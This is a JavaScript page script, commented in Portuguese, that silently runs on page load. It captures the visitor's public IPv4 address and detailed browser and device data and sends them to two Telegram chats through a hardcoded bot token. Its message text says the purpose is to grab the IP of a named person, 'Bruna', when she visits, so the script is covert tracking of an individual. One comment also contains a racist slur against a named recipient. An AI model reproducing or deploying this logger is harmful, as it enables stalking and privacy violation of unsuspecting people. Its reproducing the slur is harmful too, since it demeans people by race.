// ================================================
// script.js - Forçando IPv4 e enviando via teleporra
// ================================================

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
const CHAT_IDS = [
    "8448614204", // Mr. Lonely (Sou eu porra)
    "8219025301", // Luiz (Mono macaco queimado preto escravo)
];

// função desgraçada pra mandar msg alternativa
async function SendCoisa(text) {
    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        } catch (err) {}
    }
}

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform || "unknown",
        language: navigator.language || navigator.userLanguage || "unknown",
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',   // CPU cores
        deviceMemory: ram,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : "unknown",
        // GPU (WebGPU)
        webGPU: navigator.gpu ? "Suporta WebGPU" : "Não suporta WebGPU",
        // Outros dados do navegador
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        product: navigator.product,
        plugins: navigator.plugins ? navigator.plugins.length + " plugins" : "unknown",
        permissions: "Disponível (ver console)",
        credentials: navigator.credentials ? "Suporta" : "Não suporta"
    };
}

// ==================== PEGAR IPv4 FORÇADO ====================
async function getIPv4({ timeoutMs = 3000 } = {}) {
    const isIPv4 = ip => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(ip);

    const fetchWithTimeout = (url, opts = {}) => {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        return fetch(url, { ...opts, signal: controller.signal })
            .finally(() => clearTimeout(id));
    };

    const endpoints = [
        'https://api4.ipify.org?format=json',
        'https://api.ipify.org?format=json',
        'https://api4.my-ip.io/ip.json',
        'https://ipv4.icanhazip.com',
        'https://ipapi.co/json/'
    ];

    for (const url of endpoints) {
        try {
            const res = await fetchWithTimeout(url);
            if (!res.ok) continue;

            const text = await res.text();
            let ip;

            try {
                const json = JSON.parse(text);
                ip = json.ip || json.address;
            } catch {
                ip = text.trim();
            }

            if (isIPv4(ip)) return ip;
        } catch (e) {
            // ignora e tenta próximo fallback
        }
    }

    SendCoisa("Todos os fallbacks de IPv4 falharam");
    return "Não capturado";
}

// ==================== MENSAGEM QUANDO ENTRAR ====================
async function sendMessage(ip) {
    const device = getDeviceInfo();
    
    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (Vou ter que testar dnv essa desgraça (ela pode entrar na hora do teste))\n\n` +
                    `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                    `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
                    `• Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n` +
                    `• CPU Cores: ${device.hardwareConcurrency}\n` +
                    `• GPU: ${device.webGPU}\n` +
                    `• Cookies: ${device.cookieEnabled}\n` +
                    `• Online: ${device.onLine}\n` +
                    `• Java Enabled: ${device.javaEnabled}\n` +
                    `• App Name: ${device.appName}\n` +
                    `• App Version: ${device.appVersion}\n` +
                    `• Product: ${device.product}\n` +
                    `• Plugins: ${device.plugins}\n\n` +
                    `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendMessage(ip);
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad(); // Pega IPv4 + envia a mensagem no teleporra
}

init();
